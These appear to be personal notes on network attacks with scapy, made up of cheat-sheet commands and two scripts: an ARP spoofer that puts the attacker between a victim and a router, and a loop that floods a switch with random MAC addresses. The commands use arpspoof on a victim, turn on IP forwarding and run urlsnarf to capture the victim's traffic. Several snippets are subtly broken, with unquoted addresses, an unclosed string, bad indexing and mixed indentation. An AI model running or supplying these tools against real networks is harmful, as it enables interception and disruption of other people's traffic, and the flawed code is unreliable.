#scapy 
import scapy.all

#sniffing packets, you can filter on packet type in this example arp
scapy.all.sniff(filter="arp", count=0) 

#showing the capture 
scapy[0].show()           #will show the first captured packet 

#getting the mac address from the ip address 
scapy.all.getmacbyip("192.168.1.1") 

#creating an arp packet 
source_mac = aa:aa:aa:aa:aa:aa
dest_mac = bb:bb:bb:bb:bb:bb
source_ip = 192.168.1.1 
dest_ip = 192.168.1.101
packet = scapy.all.arp(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)

#sending a packet 
scapy.all.send(packet, verbose=False) 

#netifaces 
#save ur mac
mac = netifaces.ifaddresses("eth0)[netifaces.AF_LINK]
my_mac = mac[0]["addr"]

#save ur ip 
ip = netifaces.ifaddresses("eth0")[netifaces.AF_INET]
my_ip = ip[0]["addr"]


#linux stuff 
arp -a                                  #shows the arp table 
ip -s -s neigh flush all                #flushing the arp table 
apt-get install python3 
apt-get install python3-pip 
pip install --pre scapy[basics]
mousepad &                              #opening the mousepad editor 

apt-get update 
apt-get install dsniff                  #this has the arp spoof program 
netdiscover                             #discover ip + mac address 
echo 1 > /proc/sys/net/ipv4/ip_forward  #enable ip forwarding
arpspoof -i eth0 -t <victim-ip> <target-ip> 
urlsnarf -i eth0 

wget http://google.com





project 1 #arp spoofer 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import scapy.all 
import sys 
import netifaces 
import time 

def arp_spoof(dest_ip, dest_mac, source_ip, source_mac):
  packet = scapy.all.ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
	scapy.all.send(packet, verbose=False) 


def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
	packet = scapy.all.ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
	scapy.all.send(packet, verbose=False) 
	

def main():
	victim_ip = sys.argv[1]
	router_ip = sys.argv[2]
	victim_mac = scapy.all.getmacbyip(victim_ip) 
	router_mac = scapy.all.getmacbyip(router_ip) 
	mac = netifaces.ifaddresses("eth0")[netifaces.AF_LINK] 
	my_mac = mac[0]["addr"] 
	ip = netifaces.ifaddresses("eth0")[netifaces.AF_INET]
	my_ip = ip[0]["addr"]
	
	try:
		while True:
			arp_spoof(victim_ip, victim_mac, router_ip, my_mac)
			arp_spoof(router_ip, router_mac, victim_ip, my_mac)
			time.sleep(1)
	except KeyboardInterrupt: 
		print(" restore " )  
		arp_restore(router_ip, router_mac, victim_ip, victim_mac)
		arp_restore(victim_ip, victim_mac, router_ip, router_mac) 
		quit()
		
main() 




project 2 #arp cam flooding 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import scapy.all 
import random





def mac_generator(): 
	list = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]
	mac = "" 
	for i in range(17):
		if len(mac) not in (2, 5, 8, 11, 14):
			mac_word = random.randint(0, 15)
			mac += list[mac_word - 1]
		else:
			mac += ":" 
	return mac


def main(): 
	while True:
		mac = mac_generator() 
		arp = scapy.all.ARP()
		arp.hwsrc = mac 
		scapy.all.send(arp)
	

main() 

